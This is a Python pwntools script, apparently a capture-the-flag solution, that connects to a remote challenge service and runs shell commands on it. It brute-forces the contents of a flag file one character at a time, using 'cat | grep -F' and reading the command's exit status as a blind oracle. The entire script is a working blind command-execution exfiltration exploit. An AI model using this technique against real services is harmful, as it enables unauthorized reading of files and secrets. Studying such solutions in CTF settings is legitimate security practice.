#!/usr/bin/env python3
import pwn
from string import printable

pwn.context.log_level = 'DEBUG'

IP, PORT = 'jh2i.com', 50025
p = pwn.remote(IP, PORT)

def execute(payload):
    p.sendline(payload)
    return int(p.recvline(keepends=False).split(b'...')[0])

location = 'this_is_where_the_flag_is_plz_dont_bruteforce/flag.txt'
assert execute(f'cat {location}') == 0

leak = 'flag{okay_well_this_is_even_more_awkward}'
for _ in range(30):
    for char in ' _' + printable:
        if char in ['\\']:
            continue
        leak_cand = leak + char
        ret = execute(f'cat {location} | grep -F "{leak_cand}"')
        if ret == 0:
            leak = leak_cand
            pwn.log.info(leak)
            break
